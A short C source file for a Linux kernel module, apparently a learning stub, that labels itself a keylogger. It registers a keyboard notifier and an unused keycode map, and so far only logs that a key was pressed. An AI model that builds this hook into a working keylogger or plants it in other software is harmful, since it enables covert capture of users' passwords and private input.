#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>


static const char* keymap[] = {
	"\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y",
	"u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d",
	"f", "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z",
	"x", "c", "v", "b", "n", "m", ",", "."
};

int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param;
	param = _param;
	if (code == KBD_KEYCODE && param->down) {
		printk(KERN_NOTICE "A key was pressed...\n");
	}
	return NOTIFY_OK;
}

static struct notifier_block nb = {
	.notifier_call = notify_keypress
};

static int __init startup(void) {
	register_keyboard_notifier(&nb);
	printk(KERN_INFO "Loaded keylogger!\n");
	return 0;
}

static void __exit shutdown(void) {
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keylogger unloaded!\n");
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");

